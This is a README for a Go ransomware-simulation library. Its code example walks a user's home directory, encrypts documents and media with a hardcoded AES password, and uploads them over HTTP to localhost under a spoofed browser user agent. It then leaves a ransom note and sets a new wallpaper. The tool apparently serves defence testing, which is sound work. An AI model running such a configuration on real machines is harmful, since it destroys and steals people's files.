# Ransimware

[![Yum](https://img.shields.io/badge/-Buy%20me%20a%20cookie-blue?labelColor=grey&logo=cookiecutter&style=for-the-badge)](https://www.buymeacoffee.com/mjwhitta)

[![Go Report Card](https://goreportcard.com/badge/github.com/mjwhitta/ransimware?style=for-the-badge)](https://goreportcard.com/report/github.com/mjwhitta/ransimware)
![License](https://img.shields.io/github/license/mjwhitta/ransimware?style=for-the-badge)

## What is this?

This Go module allows you to simulate ransomware.

## How to install

Open a terminal and run the following:

```
$ go get --ldflags "-s -w" --trimpath -u \
    github.com/mjwhitta/ransimware
```

## Usage

Minimal example:

```
package main

import (
    "os"
    "path/filepath"

    rw "github.com/mjwhitta/ransimware"
)

func main() {
    var e error
    var home string
    var sim *rw.Simulator

    // Try to get home directory
    if home, e = os.UserHomeDir(); e != nil {
        panic(e)
    }

    // Create simulator with 32 worker threads
    sim = rw.New(32)

    // Since no encrypt function is defined, the default behavior is
    // to do nothing

    // Since no exfil function is defined, the default behavior is to
    // do nothing

    // Since no notify function is defined, the default behavior is to
    // do nothing

    // Target the user's Desktop directory
    if e = sim.Target(filepath.Join(home, "Desktop")); e != nil {
        panic(e)
    }

    // Run the simulator
    if e = sim.Run(); e != nil {
        panic(e)
    }
}
```

More complex example:

```
package main

import (
    "os"
    "path/filepath"
    "strings"

    rw "github.com/mjwhitta/ransimware"
)

func main() {
    var e error
    var home string
    var sim *rw.Simulator

    // Try to get home directory
    if home, e = os.UserHomeDir(); e != nil {
        panic(e)
    }

    // Create simulator with 32 worker threads
    sim = rw.New(32)

    // Include interesting extensions
    sim.Include(`\.(avi|mkv|mov|mp[34]|mpeg4?|ogg|wav)$`) // vids
    sim.Include(`\.(bmp|gif|ico|jpe?g|png|tiff)$`)        // imgs
    sim.Include(`\.(docx|pptx|txt|xlsx|zip)$`)            // docs
    sim.Include(`\.(bat|ps1|xml)$`)                       // misc

    // Ignore directories
    sim.Exclude(`All\sUsers|AppData.Local|cache2.entries|Games`)
    sim.Exclude(
        `Local\sSettings|Low.Content\.IE5|Program(Data|\sFiles)`,
    )
    sim.Exclude(`Tor\sBrowser|User\sData.Default.Cache|Windows`)

    // Ignore AnyConnect cache/config
    sim.Exclude(`\.cisco|Cisco`)

    // Ignore extensions
    sim.Exclude(`\.(bin|dll|exe|in[fi]|lnk|ransimware|sys)$`)

    // Set encryption method to AES using provided helper function
    sim.Encrypt = rw.AESEncrypt("password")

    // Set exfil method to be HTTP using provided helper function
    sim.Exfil, e = rw.HTTPExfil(
        "http://localhost:8080",
        map[string]string{
            "User-Agent": strings.Join(
                []string{
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "AppleWebKit/537.36 (KHTML, like Gecko)",
                    "Chrome/84.0.4147.105 Safari/537.36",
                },
                " ",
            ),
        },
    )
    if e != nil {
        panic(e)
    }

    // Notify user by changing wallpaper and leaving a ransom note,
    // using the provided helper functions
    sim.Notify = func() error {
        rw.RansomNote(
            filepath.Join(home, "Desktop", "ransomnote.txt"),
            []string{"This is a ransomware simulation."},
        )()

        rw.WallpaperNotify(
            filepath.Join(home, "Desktop", "ransom.png"),
            rw.DefaultPNG,
            rw.DesktopStretch,
            false,
        )()

        return nil
    }

    // Target the user's home directory
    if e = sim.Target(home); e != nil {
        panic(e)
    }

    // Run the simulator
    if e = sim.Run(); e != nil {
        panic(e)
    }
}
```

## Links

- [Source](https://github.com/mjwhitta/ransimware)

## TODO

- Provide more helper functions
    - FTP exfil
